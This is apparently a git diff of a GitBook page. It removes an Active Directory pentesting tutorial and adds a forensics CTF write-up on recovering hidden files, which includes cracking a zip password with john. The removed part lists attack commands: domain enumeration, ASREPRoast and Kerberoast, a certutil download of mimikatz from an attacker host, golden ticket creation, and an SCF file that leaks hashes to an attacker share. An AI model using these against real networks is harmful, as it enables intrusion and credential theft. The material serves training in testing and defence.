@@ -1,192 +1,80 @@
 ---
-description: Explanation of the Active Directory pentesting methodology
+description: 'Case 0: Metadata CTF for Computer Forensics. Drug dealer.'
 ---
 
-# Active Directory Principles and attacks
+# Exercise 0 - CTF metadata
 
-## Active Directory Principles
+The first step is to ensure that the file has not changed by computing the hash and comparing it with the one provided in the statement.
 
-Active Directory is a directory service developed by Microsoft for managing user accounts, computers, and other resources within a network environment. It provides a centralized database that stores information about network resources and enables administrators to manage access and permissions to these resources.
+![](<.gitbook/assets/0 (1).png>)
 
-Active Directory is commonly used in enterprise environments, where it can be used to manage large numbers of users and computers. It provides a hierarchical structure, allowing administrators to organize resources into logical groups, such as departments or locations, and apply policies and permissions to these groups.
+### **Who is Joe Jacob's supplier of marijuana and what is the address listed for the supplier?**
 
-Active Directory also supports authentication and authorization, allowing users to log in to the network and access resources based on their permissions. It can also be used to manage security policies, such as password policies and account lockout policies, and to deploy software and updates to network computers.
+Inspecting the supposedly erased file we determine that it covers 40 sectors in memory. If we inspect the first one and expand it to the whole size, using the ASCII display we can see the content of the file. As a result, Joe Jacob’s supplier of marijuana is Jimmy Jungle and the address is 626 Jungle Ave Apt 2, Jungle, NY 11111.
 
-The main principles are:
+![](<.gitbook/assets/1 (11).png>)
 
-* A **domain** represents logical group of interconnected computers that are connected to a network sharing a centralized database.
-* A **domain controler DC** is the system in charge of managing the database of the Active Directory.&#x20;
-* A **forest** is the full set of subdomains (also called trees) including the root domain.
-* A **tree** is a subdomain with a complete infraestructure. For example, in enterprise environments a tree is normally used to separate departments.
+![](<.gitbook/assets/2 (10).png>)
 
-### Active Directory enumeration
+### **What crucial data is available within the coverpage.jpg file and why is this data crucial?**
 
-With the credentials of any user, even if they do not have any privileges, it is possible to enumerate all the users on the domain. There is a concept that must be considered:
+This is how the image looks like when opening it with an image viewer. However, by inspecting the content of the image with commands like **strings** or **xxd**.
 
-* Every user and group has a RID value that identifies it within the domain.
+![](<.gitbook/assets/3 (7).png>)
 
-To enumerate the domain, with the tool `rpcclient` and some user credentials, the commands that could be used could be:
+![](<.gitbook/assets/4 (1).png>)
 
-1. Enumerate all the users on the domain.
+With the **strings** command we are able to print the strings of printable characters in files and as we can see in the image below, there is a string “pw=goodtimes” which may be a password for something.
 
-```sh
-rpcclient -U 'domain_name.local\username%password' IP_address -c 'enumdomusers'
-```
+![](<.gitbook/assets/5 (3).png>)
 
-This command will show the different users with their RID values.
+There is another way to dump the content of a file by using the command **xxd** which performs a hex dump as we can see in the image. Here the string “pw=goodtimes” appears again.
 
-2. Get the information of a specific user.
+![](<.gitbook/assets/6 (4).png>)
 
-```sh
-rpcclient -U 'domain_name.local\username%password' IP_address -c 'queryuser 0xRID'
-```
+### **What (if any) other high schools besides Smith Hill does Joe Jacobs frequent?**
 
-3. Enumerate all the groups on the domain.
+If we analyse the file called “ScheduledVisits.exe”, it is supposed to have two sectors as we can see in the image below (sectors 104 and 105).
 
-```sh
-rpcclient -U 'domain_name.local\username%password' IP_address -c 'enumdomgroups'
-```
+![](<.gitbook/assets/7 (6).png>)
 
-4. To enumerate the users belonging to the admin group, with the result of the previous command, we could get the RID value of the admin group and then:
+However, from the image details tab we can determine that the size of the file occupies 5 sectors.
 
-```sh
-rpcclient -U 'domain_name.local\username%password' IP_address -c 'querygroupmem 0xRID'
-```
+![](<.gitbook/assets/8 (2).png>)
 
-{% hint style="info" %}
-There is another way of enumerate a domain with the tool `lsadomaindump`. This tool can be obtained from GitHub and by setting up an Apache server, this tool creates a very friendly overview of the domain using tables.
-{% endhint %}
+Now, inspecting the content of the file in hex we found that the file signature corresponds with the file signature of zip file format (second image). At this point, the file is exported (the five sectors).
 
-### Access to the Active Directory
+![](<.gitbook/assets/9 (5).png>)
 
-If in the reconnaissance stage we find that the port of WinRM is opened (port 5985), we could use the tool evil-winrm to connect using any user credentials obtained.&#x20;
+![](<.gitbook/assets/10 (2).png>)
 
-```sh
-evil-winrm -u 'username' -p 'password' -i ip_address
-```
+![](<.gitbook/assets/11 (3).png>)
 
-### Active Directory attacks
+After downloading the file, it is supposed to have a file inside called “Visits.xls” but the zip file is encrypted with a password. At this point we could use the password that was found inspecting the content of the cover file but there are some alternatives to get the password.
 
-#### ASREPRoast attack
+![](<.gitbook/assets/12 (4).png>)
 
-A user is vulnerable to this type of attack if it has the property of "No previous authentication request" enabled. For this attack it is not needed any password, only the name of at least a user (normally a list of the domain users to try it with all of them). The most common way of performing this attack is the following:
+With the tool **zip2john** the hash of the zip file is obtained and then with **john** we are able to get the password of the file, which is the same as the one obtained from the cover page image. Note that it is used a wordlist called “rockyou.txt” which is a massive password dictionary.
 
-```sh
-impacket-GetNPUsers domain_name.local/ -no-pass -usersfile users.txt
-```
+![](<.gitbook/assets/13 (1).png>)
 
-{% hint style="info" %}
-`'users.txt'` is a list of users.
-{% endhint %}
+Finally, by viewing the content of the .xls file inside the zip file we can determine that Smith Hill high school is not the only one that Joe Jacobs frequents. There are several high schools that he visits as the ones that can be seen in the image below: Key High School, Leetch High School, and many more.
 
-When launching this attack, if the user is not vulnerable to it the output is "UF\_DONT\_REQUIRE\_PREAUTH". If the attack success, the hash of the user is shown.
+![](<.gitbook/assets/14 (5).png>)
 
-#### Kerberoast attack
+### **For each file, what processes were taken by the suspect to mask them from others?**
 
-For this type of attack we need valid credentials of a user. A user is vulnerable to this attack if it has a SPN (Service Principal Name) configured. With valid credentials we could use impacket as for ASREPRoast attacks.
+For the first file, the cover page, the suspect tried to mask it by changing the extension to .jpgc. Regarding the size of the file, the size of the file is supposed to be 15585 bytes which corresponds to the 31 sectors (73-103) from the image details. However, from the meta information of the file, it can be found that only one sector is used (sector 451).
 
-1. Checking if there is any vulnerable user to Kerberoast.
+The second file is called “JimmyJungle.doc” and it is not allocated so it is supposed to be erased. The size of the file is 20480 bytes which corresponds to the 40 sectors that appear in the meta information of the file (from sector 33 to 72). The suspect tried to mask this .doc file by deleting it.
 
-```bash
-impacket-GetUserSPNs domain_name.local/username:password
-```
+The last file is called “ScheduledVisits.exe”. The suspect tried to mask it by changing the extension of the file from .zip to .exe. Moreover, the size of the file is supposed to be 1000 bytes which are the two sectors which appear in the file meta information (104 and 105), but in the image details tab we can see that the file occupies 5 sectors (from 104 to 108).
 
-2. If the output of the command shows any vulnerable user, using the same command as before we could get the hash of the vulnerable user to crack it offline.
+### **What processes did you (the investigator) use to successfully examine the entire contents of each file?**
 
-```
-impacket-GetUserSPNs domain_name.local/username:password -request
-```
+For the first file, as from the image details tab we can see that the file size is 31 sectors, I got to the first one and by looking the hex dump I noticed that the first bytes corresponded to JPEG format (FF D8 FF E0 00 10 4A 46 49 46 00 01). At this point, I exported the file and then changed the extension to .jpg to then open the image. Then, using exiftool, strings and xxd I was able to get some interesting information from the file such as a possible password (goodtimes).
 
-#### Golden Ticket Attack
+For the second file, the file is supposed to be deleted but we are able to retrieve the content simply by inspecting the content of the sectors that stored the information.
 
-This attack consists of getting a ticket which provides full access to the domain. For that we need the hash of the krbtgt domain account which is in charge of managing the tickets.
+For the third file, from the fat contents tab I determined that the file size was 5 sectors, so by inspecting the content of the first sector and looking at the first bytes, I noticed that it was a zip file as the signature was 50 4B 03 04 which corresponds to zip format. After that, I exported the file and tried to decompress it but it was encrypted with a password. Then, using the password obtained from the cover page or using the tool john the ripper to crack the password, I was able to open the zip file and extract the .xls file inside.
 
-For this type of attack we need some user credentials, even if the user has low privileges. With those user credentials we can get an interactive shell using impacket as follows:
-
-```sh
-impacket-psexec domain_name.local/username:password@IP_address cmd.exe
-```
-
-Once we get this interactive shell, the steps to perform a golden ticket attack would be the following:
-
-1. Getting the krbtgt account information:
-   * To do this, we need to share some resources from the attacker's machine to the target machine such as the mimikatz.exe to launch the tool. To do so, in the attacker's machine we could set up a python server with `python -m SimpleHTTPServer` and in the target machine get the resource using the `certutil.exe` utility.&#x20;
-
-{% hint style="info" %}
-`certutil.exe` is a native binary that is supposed to be used to manage certificates but it can be used to download files. In this case, we must specify the arguments `-urlcache` and `-f` to force the binary to fetch the URL and update the cache. As it is a native binary, it isn't normally blocked.
-{% endhint %}
-
-```bash
-certutil.exe -f -urlcache -split http://attacker_IP_address:port/mimikatz.exe mimikatz.exe
-```
-
-2. In the target machine, having uploaded mimikatz, we run the tool and then we can dump the information of the `krbtgt` account with:
-
-```
-lsadump::lsa /inject /name:krbtgt
-```
-
-3. To then create the golden ticket there are several ways but here only two are explained:
-
-#### Creating a `.kirbi` file
-
-1. With the information of the krbtgt user, we can create a golden ticket as follows:
-
-```
-kerberos::golden /domain:[domain_name.local] /sid:[sid_domain] /rc4:[NTLM_krbtgt] /user:[username] /ticket:[filename_gt.kirbi]
-```
-
-1. With the `file.kirbi` created, we transfer this file to the attacker's machine using the utility `impacket-smbserver` for example.&#x20;
-2. Once with the golden ticket, within any user account with no privileges, with a simple python server we could transfer mimikatz and the golden ticket and execute the following in mimikatz to access privileged information:
-
-```
-kerberos::ptt golden.kirbi
-```
-
-#### Using the impacket tool ticketer
-
-1. With the following command it will be created and saved a golden ticket for the user USERNAME specified in the command using `.ccache` extension.
-
-```
-impacket-ticketer -nthash [NTLM_hash] -domain-sid [domain_sid] -domain [domain_name] USERNAME
-```
-
-2. To achieve full persistence we need to export the environment variable to the path of our golden ticket, which is the path of the credential cache:
-
-```bash
-export KRB5CCNAME="path/to/the/file/USERNAME.ccache"
-```
-
-Now, we can connect using `impacket-psexec` to any user account without specifying the password, using the arguments `-n` and `-k`.
-
-```
-impacket-psexec -n -k domain_name.local/username@IP_address cmd.exe
-```
-
-Moreover, even if the password of the user is changed, the golden ticket will still work and the attacker will still be able to log as any user.&#x20;
-
-{% hint style="info" %}
-There is another tool called `Rubeus` that can be used to perform most attacks in AD such as ASREPRoast and Kerberoast.
-{% endhint %}
-
-{% hint style="info" %}
-There are also graphical tools like Neo4j and BloodHunt that provides a lot of information and graphs representing the AD environment, attack vectors, vulnerable accounts, etc.&#x20;
-{% endhint %}
-
-#### Another attacks --> file.scf
-
-This type of files are called Shell Command Files and they are very characteristic as they could work as a vector attack for the attackers. If there is a shared resource that can be accessed, authenticated as a user or even unauthenticated, the attacker could create a file with `.scf` extension.
-
-{% hint style="info" %}
-These files are very characteristic as they have a parameter called IconFile that can be loaded from another place. If in the IconFile field we specify that the resource will be loaded from a resource in the attacker's machine, whenever the administrator browses through the shared folder the hash would be sent to the attacker. In this case the attacker must have created a shared resource with `impacket-smbserver` to listen for resource requests.
-{% endhint %}
-
-The format of the file is the following:
-
-```
-[Shell]
-Command=2
-IconFile=\\X.X.X.X\share\pentestlab.ico
-[Taskbar]
-Command=ToggleDesktop
-```
